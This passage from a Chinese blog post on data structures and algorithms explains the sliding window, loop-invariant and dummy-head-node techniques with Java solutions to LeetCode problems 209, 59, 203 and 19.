index1.next;\t\t\t\tindex2 = index2.next;\t\t\t&#125;\t\t\t//返回环入口\t\t\treturn index1;\t\t&#125;\t&#125;\treturn null;&#125;\n\n迭代法双指针法用法示例（力扣206. 反转链表：在不申请额外内存空间的前提下反转链表）一题还可以使用迭代法解决：\n\n\n\n\n滑动窗口法滑动窗口法就是通过不断地调整子数组的起始位置和终止位置，并根据需要计算窗口内元素的值。\n要实现滑动窗口法，主要是解决以下三点：\n\n窗口内的元素是什么\n如何确定窗口的起始位置\n如何确定窗口的终止位置\n\n用法示例（力扣209. 长度最小的子数组：找到一个长度最小的连续子数组，子数组元素之和需大于等于目标值）：\npublic int minSubArrayLen(int target, int[] nums) &#123;       //结果       int result = Integer.MAX_VALUE;       //子数组的长度       int subLength = 0;       //滑动窗口内的元素和       int sum = 0;       //设子数组的起点为i       int i = 0;       //设子数组的终点为j       for (int j = i; j &lt; nums.length; j++) &#123;           sum += nums[j];           //如果满足sum&gt;=target的条件           while (sum &gt;= target) &#123;               //计算子数组的长度               subLength = (j - i + 1);               //更新窗口的长度               result = Math.min(result, subLength);               //就向右移动窗口的起始位置，直到不满足               sum -= nums[i++];           &#125;       &#125;       //如果还是初始值，说明不存在符合条件的子数组，返回0       return result == Integer.MAX_VALUE ? 0 : result;   &#125;\n\n循环不变量循环不变量规则，是在循环中，每一次边界的处理都根据区间的定义来操作。\n用法示例（力扣59. 螺旋矩阵 II：按照螺旋顺序填充二维数组中的元素）：\n\n矩阵的四条边都要坚持一致的左闭右开或者左开右闭的原则，即遵守循环不变量原则。这样才能按照统一的规则输出二维矩阵，不至于思路和代码混乱。\n此处按照左闭右开的循环不变量原则进行实现。\n\n\npublic int[][] generateMatrix(int n) &#123;    int[][] result = new int[n][n];    int count = 1;    int loop = n / 2;    int i, j;    int startX = 0, startY = 0;    int offset = 1;    while (loop-- &gt; 0) &#123;        i = startX;        j = startY;        //按照左闭右开的规则，从左到右填充        for (j = startY; j &lt; startY + n - offset; j++) &#123;            result[i][j] = count++;        &#125;        //按照左闭右开的规则，从上到下填充        for (i = startX; i &lt; startX + n - offset; i++) &#123;            result[i][j] = count++;        &#125;        //按照右闭左开的规则，从右到左填充        for (; j &gt; startY; j--) &#123;            result[i][j] = count++;        &#125;        //按照下闭上开的规则，从下到上填充        for (; i &gt; startX; i--) &#123;            result[i][j] = count++;        &#125;        //起始位置加1        startX++;        startY++;        //offest用于控制每一圈的每一条边遍历的长度        offset += 2;    &#125;    //如果n是奇数，则为中间位置的元素赋值    if ((n &amp; 1) == 1) &#123;        int mid = n / 2;        result[mid][mid] = count;    &#125;    return result;&#125;\n\n虚拟头节点链表删除元素的操作有两种操作方式：\n\n直接使用原链表执行删除操作\n设置一个虚拟头节点再执行删除操作\n\n对于第一种操作方式，删除头节点和删除其它节点的操作是不一样的，因为链表中其它节点是通过前一个节点来删除的，而头节点没有前一个节点，在这种操作方式下，头节点的删除是通过将头节点向后移实现的。\n对于第二种操作方式，为链表设置一个虚拟头节点后，原链表的所有节点都可以按照统一的方式删除。\n用法示例（力扣203. 移除链表元素：删除链表中指定值的节点）：\npublic ListNode removeElements(ListNode head, int val) &#123;\tListNode dummyHead = new ListNode(0);    //将虚拟头节点的next指向head\tdummyHead.next = head;\tListNode cur = dummyHead;\twhile (cur.next != null) &#123;\t\tif (cur.next.val == val) &#123;\t\t\tcur.next = cur.next.next;\t\t&#125; else &#123;\t\t\tcur = cur.next;\t\t&#125;\t&#125;    //dummyHead.next是链表执行删除节点后的头节点\treturn dummyHead.next;&#125;\n\n用法示例（力扣19. 删除链表的倒数第 N 个结点：使用双指针法和虚拟头节点实现删除链表后部的第n个节点）：\npublic ListNode removeNthFromEnd(ListNode head, int n) &#123;\t//此处之所以使用dummyHead，是为了统一删除逻辑\tListNode dummyHead = new ListNode(0);\tdummyHead.next = head;\t//如果要删除倒数第n个节点，则让fast从dummyHead向前移动n+1步，然后让fast和slow同时移动，\t//直到fast指向链表末尾，此时slow指向的就是被删除节点的上一个节点\tListNode fast = dummyHead;\tListNode slow = dummyHead;\t//之所以是前移n+1步，是为了保证slow和fast之间的距离是n+1，即保证slow指向被删除节点的上一个节点\twhile (n-- &gt;= 0) &#123; //此处没有处理异常，如需要可在循环内添加处理操作\t\tfast = fast.next;\t&#125;\twhile (fast != null) &#123;\t\tfast = fast.next;\t\tslow = slow.next;\t&#125;   \t//统一后的删除操作\tslow.next = slow.next.next;\treturn dummyHead.next;&#125;\n\n哈希法","categories":["IT"],"tags":["数据结构和算法"]}]